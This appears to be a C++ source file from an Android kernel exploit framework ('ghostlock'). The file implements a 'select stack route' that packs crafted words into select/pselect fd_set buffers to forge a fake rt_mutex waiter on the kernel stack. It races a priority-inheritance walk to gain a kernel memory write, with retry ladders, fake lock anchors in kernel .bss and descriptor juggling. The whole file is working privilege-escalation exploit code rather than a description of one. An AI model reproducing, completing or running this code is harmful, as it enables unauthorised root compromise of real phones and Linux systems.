#include "route/select_stack_route.h"

#include <fcntl.h>
#include <unistd.h>

#include <array>
#include <cerrno>
#include <cstdio>
#include <cstring>
#include <string>
#include <utility>

#include "route/route_policy.hpp"
#include "session/runtime_config.h"
#include "session/runtime_paths.h"

using namespace ghostlock;

namespace ghostlock::route::select_stack {
    SelectStackRoute::SelectStackRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value,
        profile::SelectStackLayout route_layout,
        const std::array<int32_t, 3> &stdio_backup_value) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = support::BorrowedFd(stdio_backup_value[fd]);
        }
        /* The C version memset the whole context; zero the sets explicitly so a
   * destroy() before prepare() never tests uninitialized bits. */
        input_set.zero();
        output_set.zero();
        exception_set.zero();
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
        status.code = ROUTE_RETRYABLE;
    }

    SelectStackRoute::SelectStackRoute(
        SelectStackRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          layout(other.layout),
          input_set(other.input_set),
          output_set(other.output_set),
          exception_set(other.exception_set),
          owned_input_set(other.owned_input_set),
          owned_output_set(other.owned_output_set),
          owned_exception_set(other.owned_exception_set),
          pipe_read(std::move(other.pipe_read)),
          pipe_write(std::move(other.pipe_write)),
          block(std::move(other.block)),
          high_read(std::move(other.high_read)),
          block_borrows_pipe(other.block_borrows_pipe),
          selected_fds_installed(other.selected_fds_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          select_result(other.select_result),
          select_errno(other.select_errno),
          status(other.status) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = other.stdio_backup[fd];
        }
    }

    int32_t SelectStackRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SelectStackRoute::disarm() noexcept {
        race->consumer_go.store(0);
        /* A call the attempt loop already found wedged is not waited on twice
         * -- this poll sleeps through schedule(), i.e. over the frame the walk
         * is reading. */
        if (!consumer_stuck && race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SelectStackRoute::retain_for_process_lifetime() noexcept {
        /* A stuck consumer may still walk these descriptors, so none of them may be
   * closed: hand every owner's descriptor to the process lifetime. */
        (void) high_read.release_to_process_lifetime("pselect consumer stuck");
        if (!block_borrows_pipe) {
            (void) block.release_to_process_lifetime("pselect consumer stuck");
        }
        (void) pipe_read.release_to_process_lifetime("pselect consumer stuck");
        (void) pipe_write.release_to_process_lifetime("pselect consumer stuck");
        /* The dup2-installed descriptors stay open as well: selected_fds_installed
   * remains set and nothing below closes them. */
    }

    void SelectStackRoute::destroy() noexcept {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            if (stdio_backup[fd].valid())
                dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
        }
        if (consumer_stuck) {
            (void) fail(34, select_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            retain_for_process_lifetime();
            return;
        }
        if (selected_fds_installed) {
            /* Idempotent: a no-op once the per-attempt restore has run. */
            route::restore_selected_fds();
            selected_fds_installed = 0;
        }
        high_read.reset();
        if (!block_borrows_pipe) block.reset();
        pipe_read.reset();
        pipe_write.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
    /* The poisoned sets' bits are the payload, not fds this route owns: each
     * slot the dup2 pass rebinds is copied first, and restored after. */
    struct SelectedFdBackupEntry {
        int32_t fd;
        /* F_DUPFD copy; -1 if the slot was closed or could not be copied. */
        int32_t backup;
        int32_t cloexec;
    };

    static std::array<SelectedFdBackupEntry, PSELECT_ROUTE_NFDS> selected_fd_backup;
    static size_t selected_fd_backup_n = 0;

    void restore_selected_fds(void) {
        for (size_t i = 0; i < selected_fd_backup_n; i++) {
            const SelectedFdBackupEntry &e = selected_fd_backup[i];
            if (e.backup >= 0) {
                if (dup2(e.backup, e.fd) >= 0 && e.cloexec) {
                    (void) fcntl(e.fd, F_SETFD, FD_CLOEXEC);
                }
                close(e.backup);
            } else {
                close(e.fd);
            }
        }
        selected_fd_backup_n = 0;
    }

    /* Rebinds every slot the poisoned sets name, copying each first. Returns -1
     * if read_fd cannot be duplicated, else the count rebound uncopied. */
    int32_t open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int32_t read_fd, int32_t write_fd,
        int32_t *error_number) {
        /* every bit lands on the read end so select/pselect parks the full window */
        (void) write_fd;
        *error_number = 0;
        int32_t high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
        if (high_read < 0) {
            *error_number = errno;
            return -1;
        }
        selected_fd_backup_n = 0;
        size_t recorded = 0;
        int32_t lost = 0;
        /* The forced slot is installed below, so it must be in the scan: an
         * unrecorded slot is a descriptor the route destroys for good. */
        FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
        for (int32_t fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
                if (recorded < selected_fd_backup.size()) {
                    SelectedFdBackupEntry &e = selected_fd_backup[recorded++];
                    e.fd = fd;
                    /* Read the flags before the dup2 below rebinds the slot. */
                    const int32_t flags = fcntl(fd, F_GETFD);
                    if (flags < 0) {
                        e.backup = -1;
                        e.cloexec = 0;
                    } else {
                        e.cloexec = flags & FD_CLOEXEC;
                        e.backup = fcntl(fd, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 64);
                        if (e.backup < 0) {
                            if (lost == 0) *error_number = errno;
                            lost++;
                        }
                    }
                }
                dup2(high_read, fd);
            }
        }
        /* At most PSELECT_ROUTE_NFDS bits can be set; the guard is for a resize. */
        selected_fd_backup_n = recorded;
        close(high_read);
        dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
        return lost;
    }
} // namespace ghostlock::route

#if defined(__ANDROID__)
#include "common.h"

#include <array>
#include <ctime>
#include <iterator>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/timerfd.h>

#include "kernel/target.h"
#include "session/exploit_session.hpp"

/* The two Multicast stamp buffers intentionally remain dynamic stack frames.
 * Their layout/order is device-verified and must not become heap-backed STL. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "route/route_lifecycle.hpp"
#include "route/select_stack_route.h"
#include "route/tcp_zerocopy_route.h"

using namespace ghostlock;

namespace ghostlock::route {
    /* The fd pass is shared with the host build and silent; log what it reports. */
    static void install_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int32_t read_fd, int32_t write_fd) {
        int32_t error_number = 0;
        const int32_t unbacked = open_selected_fds(in, out, ex, read_fd, write_fd,
                                                  &error_number);
        if (unbacked < 0) {
            pr_warning("pselect F_DUPFD read errno=%d\n", error_number);
        } else if (unbacked > 0) {
            pr_warning("pselect fd backup: %d live descriptor(s) could not be copied "
                       "(errno=%d); they are closed when the route restores\n",
                       unbacked, error_number);
        }
    }

    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_time::runtime_elapsed_ms(ref);
    }

    } // namespace ghostlock::route


namespace ghostlock::route {
    /* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
    static uint32_t route_delay_usec(const select_stack::SelectStackRoute *context,
                                int32_t attempt) {
        if (!context->layout.compact_waiter.value_or(0)) {
            (void) attempt;
            /* Let select establish its frame and stamp the crafted waiter before
         * the PI walk fires. */
            return context->profile.select_enter_delay_us();
        }
        /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
     * first attempt. The ladder stays native-side until a Select device can
     * validate a schema extension. */
        const uint32_t seed = context->profile.select_enter_delay_us();
        static constexpr std::array<uint32_t, 8> delays = {
            50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
        };
        const uint32_t ladder = delays[static_cast<size_t>((attempt - 1) % 8)];
        return attempt == 1 && seed != 0 ? seed : ladder;
    }

    void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
        unsigned long *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = static_cast<unsigned long>(value);
    }

    uint64_t fdset_get_word(const fd_set *set, int32_t word) {
        const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
        return bits[word];
    }

    static int32_t pselect_words_per_set(void) {
        int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
        return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
    }

    static int32_t pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int32_t words_per_set,
        int32_t global_word, uint64_t value) {
        if (global_word < 0) {
            return 0;
        }

        int32_t set_idx = global_word / words_per_set;
        int32_t word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return 1;
            case 1:
                fdset_put_word(out, word_idx, value);
                return 1;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return 1;
            default:
                return 0;
        }
    }

    static int32_t pselect_waiter_shift(const select_stack::SelectStackRoute *context) {
        return session::g_exploit_session.profile.loaded()
                   ? context->layout.waiter_shift.value_or(0)
                   : kernel::PSELECT_WAITER_WORD_SHIFT;
    }

    /* The walk dereferences waiter->lock (+0x38); the read-back covers the user
     * copy only. */
    static bool pselect_put_waiter_word(
        select_stack::SelectStackRoute *context, int32_t words_per_set,
        int32_t waiter_word, uint64_t value, const char *name) {
        int32_t global_word = pselect_waiter_shift(context) + waiter_word;
        int32_t placed = pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
        if (!placed) {
            pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                       "words_per_set=%d nfds=%d\n",
                       name, waiter_word, global_word, words_per_set,
                       PSELECT_ROUTE_NFDS);
            return false;
        }

        const int32_t set_idx = global_word / words_per_set;
        const int32_t word_idx = global_word % words_per_set;
        const fd_set *set = set_idx == 0   ? context->input_set.raw()
                            : set_idx == 1 ? context->output_set.raw()
                                           : context->exception_set.raw();
        const uint64_t back = fdset_get_word(set, word_idx);
        if (back != value) {
            pr_warning("waiter word %s did not land: wrote 0x%llx read back "
                       "0x%llx (global_word=%d)\n",
                       name, static_cast<unsigned long long>(value),
                       static_cast<unsigned long long>(back), global_word);
            return false;
        }
        return true;
    }

    static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};

    void reserve_standard_io(void) {
        for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
            if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
            int32_t backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
            if (backup < 0) {
                pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
            } else {
                standard_io_backup[static_cast<size_t>(fd)] = backup;
            }
        }
    }

    static void restore_standard_io(const std::array<support::BorrowedFd, 3> &backup) {
        for (size_t fd = 0; fd < backup.size(); fd++) {
            if (!backup[fd].valid()) continue;
            dup2(backup[fd].get(), static_cast<int32_t>(fd));
        }
    }

    /* The fake rt_mutex is 0x20 bytes here (wait_lock, two rb words, owner)
     * and only the rb words are written, so slots cannot overlap. The region is
     * the page-sized dump_skip.zeroes, boxed in by live symbols: past its end
     * must be refused. All three numbers come from the profile. */
    static constexpr uintptr_t kLockAnchorStrideDefault = 0x20;
    static constexpr uintptr_t kLockAnchorBytesDefault = 0x1000;
    /* `owner` at +0x18: closer slots would share a word. */
    static constexpr uintptr_t kLockAnchorStrideMin = 0x20;

    struct AnchorGeometry {
        uintptr_t stride;
        uintptr_t bytes;
        uintptr_t slots;
    };

    /* False when the two keys cannot describe one grid; the caller must fail,
     * not fall back. */
    static bool anchor_geometry(const profile::SelectStackLayout &layout,
                                AnchorGeometry *out) {
        const uintptr_t stride = layout.lock_anchor_stride
                                     ? static_cast<uintptr_t>(*layout.lock_anchor_stride)
                                     : kLockAnchorStrideDefault;
        const uintptr_t bytes = layout.lock_anchor_bytes
                                    ? static_cast<uintptr_t>(*layout.lock_anchor_bytes)
                                    : kLockAnchorBytesDefault;
        if (stride < kLockAnchorStrideMin || bytes == 0 || bytes % stride != 0) {
            pr_error("[route] anchor geometry unusable (bytes=0x%llx stride=0x%llx): bytes must be a "
                     "non-zero multiple of the stride, and the stride at least 0x%llx -- the fake "
                     "rt_mutex reaches owner@+0x18, so closer slots share a word\n",
                     static_cast<unsigned long long>(bytes),
                     static_cast<unsigned long long>(stride),
                     static_cast<unsigned long long>(kLockAnchorStrideMin));
            return false;
        }
        out->stride = stride;
        out->bytes = bytes;
        out->slots = bytes / stride;
        return true;
    }

    static bool read_boot_id(char *out, size_t capacity) {
        FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
        if (!f) return false;
        const bool ok = fgets(out, static_cast<int32_t>(capacity), f) != nullptr;
        fclose(f);
        if (!ok) return false;
        for (size_t i = 0; out[i] != '\0'; i++) {
            if (out[i] == '\n') {
                out[i] = '\0';
                break;
            }
        }
        return out[0] != '\0';
    }

    /* Persist the reservation before the slot is handed out: that is what
     * stops a later process from being given it again. The grid is stamped
     * too, so a file written under a different stride/region is not resumed. */
    static bool write_anchor_state(const std::string &path, const char *boot_id,
                                   uintptr_t next_slot, uintptr_t slots) {
        FILE *f = fopen(path.c_str(), "w");
        if (!f) return false;
        const int32_t written = fprintf(f, "%s %llu %llu\n", boot_id,
                                        static_cast<unsigned long long>(next_slot),
                                        static_cast<unsigned long long>(slots));
        const bool ok = written > 0 && fflush(f) == 0;
        fclose(f);
        return ok;
    }

    /* Boot-scoped slot allocator, monotonic across processes. A run poisons
     * every slot it uses: the fake waiter is enqueued into lock->waiters and
     * points into a freed kernel stack, so a later walk reaching it data-aborts.
     * The chunk's END is persisted before any slot in it is handed out; a run
     * that dies mid-chunk only skips the rest of the chunk. */
    static constexpr uintptr_t kLockAnchorChunk = 8;

    static uintptr_t select_stack_anchor_slot(const AnchorGeometry &geom) {
        static bool loaded = false;
        static char boot_id[64] = {};
        static std::string state_path;
        static uintptr_t next = 0;      /* next slot to hand out */
        static uintptr_t reserved = 0;  /* high-water mark already in the file */
        static uintptr_t loaded_slots = 0;

        if (loaded && loaded_slots != geom.slots) {
            /* One profile per process today; a second grid against the first's
             * high-water mark would hand out slots the file does not describe. */
            pr_error("[route] anchor geometry changed mid-process (%llu -> %llu slots); "
                     "refusing to reuse this boot's slot state\n",
                     static_cast<unsigned long long>(loaded_slots),
                     static_cast<unsigned long long>(geom.slots));
            return geom.slots;
        }

        if (!loaded) {
            loaded = true;
            loaded_slots = geom.slots;
            state_path = config::anchor_state_file(config::runtime_config_snapshot().home_dir);
            if (!read_boot_id(boot_id, sizeof boot_id)) {
                /* Not fatal: without a boot id we fall back to comparing the
                 * sentinel with itself, i.e. "same boot", which is the
                 * conservative reading of an unreadable /proc. */
                std::strncpy(boot_id, "unknown-boot", sizeof boot_id - 1);
            }

            char stored_boot[64] = {};
            unsigned long long stored_next = 0;
            unsigned long long stored_slots = 0;
            bool have_boot = false;
            bool have_all = false;
            if (FILE *f = fopen(state_path.c_str(), "r")) {
                /* The boot id alone is authoritative; the rest is only meaningful
                 * within the boot that wrote it, so an older writer's file (say
                 * one without the grid field) still gets its boot id honoured. */
                have_boot = fscanf(f, "%63s", stored_boot) == 1;
                if (have_boot) {
                    have_all = fscanf(f, "%llu %llu", &stored_next, &stored_slots) == 2;
                }
                fclose(f);
            }
            const bool same_boot = have_boot && std::strcmp(stored_boot, boot_id) == 0;
            const bool grid_ok = have_all && stored_slots == geom.slots;

            if (same_boot && grid_ok && stored_next <= geom.slots) {
                next = static_cast<uintptr_t>(stored_next);
                pr_info("[route] anchor slots: %llu/%llu already spent this boot\n",
                        static_cast<unsigned long long>(next),
                        static_cast<unsigned long long>(geom.slots));
            } else if (have_boot && !same_boot) {
                /* A different boot id is proof the region was re-zeroed (.bss is
                 * zeroed at boot), so slot 0 is pristine again whatever the rest
                 * of the file says -- including a file from an older format. */
                pr_info("[route] anchor slots: new boot, region zeroed again; "
                        "starting at 0/%llu\n",
                        static_cast<unsigned long long>(geom.slots));
            } else if (same_boot && have_all) {
                /* Same boot, untrustworthy grid or count: the region is still
                 * poisoned and this file cannot say where the high-water mark is.
                 * Refuse rather than guess. */
                pr_error("[route] anchor state is not usable for this build "
                         "(grid %llu vs %llu, next %llu); reboot the device and run again\n",
                         stored_slots, static_cast<unsigned long long>(geom.slots),
                         stored_next);
                next = geom.slots;
            } else if (config::runtime_config_snapshot().anchor_trusted) {
                /* The app proved this install predates the boot: any run would
                 * have written the file, so its absence means the region is
                 * still zeroed. Withheld when the install postdates the boot --
                 * then a previous install may have poisoned it. */
                if (!write_anchor_state(state_path, boot_id, 0, geom.slots)) {
                    pr_error("[route] anchor slot state is missing and cannot be created in %s; "
                             "refusing to start from a slot this boot may already have spent\n",
                             state_path.c_str());
                    next = geom.slots;
                } else {
                    pr_info("[route] anchor slots: no state file and this install predates the "
                            "boot; starting at 0/%llu\n",
                            static_cast<unsigned long long>(geom.slots));
                }
            } else {
                /* No usable reservation file, and there is no safe guess which
                 * slots this boot already spent; 0 is the one slot a previous
                 * run is guaranteed to have used. Refuse; a reboot re-zeroes
                 * the region. */
                pr_error("[route] anchor slot state missing/unusable (%s); cannot tell which "
                         "slots this boot already spent -- reboot the device and run again\n",
                         state_path.c_str());
                next = geom.slots;
            }
        }

        if (next >= geom.slots) return geom.slots;
        if (next >= reserved) {
            /* Persist the next chunk's end before handing out a slot from it, so
             * a failed write retries rather than leaking an unrecorded slot. */
            uintptr_t want = next + kLockAnchorChunk;
            if (want > geom.slots) want = geom.slots;
            if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
                pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
                         "hand out a slot a later process would be given again\n",
                         state_path.c_str());
                return geom.slots;
            }
            reserved = want;
            pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
                    static_cast<unsigned long long>(next),
                    static_cast<unsigned long long>(reserved - 1),
                    static_cast<unsigned long long>(geom.slots));
        }
        return next++;
    }

    static bool select_stack_build_fdsets(select_stack::SelectStackRoute *context,
                                          int32_t attempt) {
        select_stack::FdSet *in = &context->input_set;
        select_stack::FdSet *out = &context->output_set;
        select_stack::FdSet *ex = &context->exception_set;
        const memory::WriteRequest *request = context->request;
        in->zero();
        out->zero();
        ex->zero();

        int32_t words_per_set = pselect_words_per_set();
        int32_t compact = context->layout.compact_waiter.value_or(0);

        struct pselect_waiter_word {
            int32_t word;
            uint64_t value;
            const char *name;
        };

        /* A word that did not land, or a spent slot budget, must fail the route. */
        bool stamped = true;
        bool anchor_ok = true;

        if (compact) {
            /* An all-zero parking node: the erase's childless case with parent 0
             * clears the lock's waiter tree instead of writing through a pointer. */
            uint64_t lock_word = session::g_exploit_session.heap.current.fake_lock;
            if (const auto anchor = context->layout.lock_anchor_image) {
                /* Waiters die with the attempt: one fresh slot per attempt. */
                AnchorGeometry geom = {};
                if (!anchor_geometry(context->layout, &geom)) {
                    anchor_ok = false;
                } else if (const uintptr_t slot = select_stack_anchor_slot(geom);
                           slot >= geom.slots) {
                    pr_error("[route] anchor slot budget for this boot is spent (%llu slots of "
                             "0x%llx bytes at stride 0x%llx, one per attempt); refusing to walk "
                             "past the zeroed region into live .bss -- reboot to reset it\n",
                             static_cast<unsigned long long>(geom.slots),
                             static_cast<unsigned long long>(geom.bytes),
                             static_cast<unsigned long long>(geom.stride));
                    anchor_ok = false;
                } else {
                    const uintptr_t rotation = geom.stride * slot;
                    lock_word = session::g_exploit_session.addresses.data_alias(
                        static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + *anchor) + rotation);
                    pr_info("[route] lock anchor: image +0x%llx (attempt %d, slot %llu, "
                            "+0x%llx) -> direct map 0x%llx\n",
                            static_cast<unsigned long long>(*anchor), attempt,
                            static_cast<unsigned long long>(slot),
                            static_cast<unsigned long long>(rotation),
                            static_cast<unsigned long long>(lock_word));
                }
            }

            /* The same helper the compact encoder uses. A parentless pc would
             * plant the target in the lock's tree root. */
            const memory::PayloadWriteLayout stamp_layout = {
                .parent = (session::g_exploit_session.heap.current.fake_parent),
                .right = (session::g_exploit_session.heap.current.fake_right),
                .left = (session::g_exploit_session.heap.current.fake_left),
            };
            const memory::WaiterTreeStamp stamp =
                    memory::waiter_tree_stamp(stamp_layout);
            pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
                    static_cast<unsigned long long>(stamp.pc),
                    static_cast<unsigned long long>(stamp.right),
                    static_cast<unsigned long long>(stamp.left),
                    static_cast<unsigned long long>(request->target));

            struct pselect_waiter_word words[] = {
                {2, stamp.pc, "tree_pc"},
                {3, stamp.right, "tree_right"},
                {4, stamp.left, "tree_left"},
                /* PI side parks: build N carried the payload here instead (the
             * rt_mutex_dequeue_pi erase) and wrote nothing — see the note above.
             * Zeroes keep the pi node out of every erase and every descent. */
                {5, 0, "pi_pc"},
                {6, 0, "pi_right"},
                {7, 0, "pi_left"},
                {8, ghostlock::profile::slide_init_task(), "task"},
                {9, lock_word, "lock"},
                /* waiter+0x40 is `int prio` on 5.10; 5.15/6.1 put wake_state
                 * there, packed as (prio << 32) | wake_state. Both families take
                 * this branch, so the word comes from the family-gated helper. */
                {10,
                 kernel::waiter_prio_word(kernel::FAKE_WAITER_PRIO,
                                          session::g_exploit_session.profile
                                                  .compact_waiter_has_wake_state()),
                 "prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };

            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                if (!pselect_put_waiter_word(context, words_per_set, w->word,
                                             w->value, w->name)) {
                    stamped = false;
                }
            }
            if (!stamped) {
                pr_warning("fake waiter (compact) is INCOMPLETE -- the walk "
                           "dereferences waiter+0x38 lock, +0x40 prio and "
                           "+0x48 deadline; a wrong word there oopses at "
                           "rt_mutex_adjust_prio_chain+0x188\n");
            }
        } else {
            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
            struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, 1, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, 1, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, ghostlock::profile::slide_init_task(), "task"},
                {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                {14, 3, "wake_state"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                if (!pselect_put_waiter_word(context, words_per_set, w->word,
                                             w->value, w->name)) {
                    stamped = false;
                }
            }
            if (!stamped) {
                pr_warning("fake waiter (6.6 shape) is INCOMPLETE -- see the "
                           "note in pselect_put_waiter_word\n");
            }
        }
        return stamped && anchor_ok;
    }
} // namespace ghostlock::route

namespace ghostlock::route::select_stack {
    int32_t SelectStackRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
            (session::g_exploit_session.
                heap.current.fake_fops)) {
            pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(30, 0);
        }
        int32_t fds[2];
        if (pipe(fds) != 0) {
            return fail(31, errno);
        }
        pipe_read.reset(fds[0]);
        pipe_write.reset(fds[1]);

        /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
        block.reset(static_cast<int32_t>(syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC)));
        if (!block.valid()) {
            pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                       errno);
            block_borrows_pipe = 1;
        }
        high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
        if (!high_read.valid()) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return fail(32, errno);
        }

        if (!route::select_stack_build_fdsets(this, 1)) {
            /* Either a waiter word did not land or the boot's anchor slots are
             * spent; both make the fake waiter unsafe to walk. */
            return fail(34, ENOSPC);
        }
        pr_info("pselect route setup shift=%d page=%016zx "
                "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
                "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
                "ex1=%016llx ex2=%016llx ex3=%016llx\n",
                route::pselect_waiter_shift(this),
                (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
                (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));

        /* The route may replace low fds, including stdout and stderr. */
        route::install_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                                    high_read.get(), pipe_write.get());
        owned_input_set = input_set;
        owned_output_set = output_set;
        owned_exception_set = exception_set;
        high_read.reset();
        selected_fds_installed = 1;
        return 0;
    }

    route::RouteStatus SelectStackRoute::execute() noexcept {
        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
     * The consumer handshake advances consumer_go per attempt so the trigger
     * is seen as a new sequence. */
        const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
        int32_t calls_total = 0;
        int32_t successes_total = 0;

        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            if (attempt > 1) {
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
                    !(session::g_exploit_session.heap.current.fake_fops)) {
                    pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                if (!route::select_stack_build_fdsets(this, attempt)) {
                    (void) fail(34, ENOSPC);
                    break;
                }
                route::install_selected_fds(input_set.raw(), output_set.raw(),
                                            exception_set.raw(), block_fd(),
                                            pipe_write.get());
                owned_input_set = input_set;
                owned_output_set = output_set;
                owned_exception_set = exception_set;
            }

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            uint32_t delay_usec = route::route_delay_usec(this, attempt);
            race->route_delay_usec.store(delay_usec);
            race->consumer_go.store(attempt);

            pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                    attempt, attempts, layout.compact_waiter.value_or(0),
                    route::fops_elapsed_ms(&route_t0));
            errno = 0;
            if (layout.compact_waiter.value_or(0)) {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timespec ts = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
                };
                select_result = pselect(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &ts, nullptr);
            } else {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timeval timeout = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_usec = timeout_us % 1000000,
                };
                select_result = select(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &timeout);
            }
            select_errno = errno;
            /* The consumer's call is still in the kernel and the walk reads the
             * stamped fd_set buffer out of THIS thread's stack. Everything below
             * writes over that stack, so close the sequence and wait it out. */
            const int32_t drain_ms =
                    race->wait_consumer_idle(ghostlock::race::PiRace::kConsumerDrainMs);
            /* The attempt's frame is dead weight from here on: the restores
             * below are the next syscalls to run over it, and a consumer
             * sched_setattr walking this thread's pi_blocked_on would read
             * whatever they leave. Clear the pointer first. */
            if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
                int32_t disarm_errno = 0;
                (void) support::ghost_disarm("attempt", &disarm_errno);
            }
            route::restore_standard_io(stdio_backup);
            route::restore_selected_fds();
            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d drain=%dms\n",
                    attempt, attempts, layout.compact_waiter.value_or(0),
                    route::fops_elapsed_ms(&route_t0), select_result, drain_ms);

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            if (drain_ms >= 0 && calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            if (drain_ms < 0) {
                /* A wedged walk: another attempt would only write over it. Stop
                 * and let the lifecycle report the race dirty. */
                consumer_stuck = 1;
                (void) fail(38, 0);
                status.code = ROUTE_DIRTY_FAILURE;
                break;
            }
            (void) fail(33, select_errno);
        }
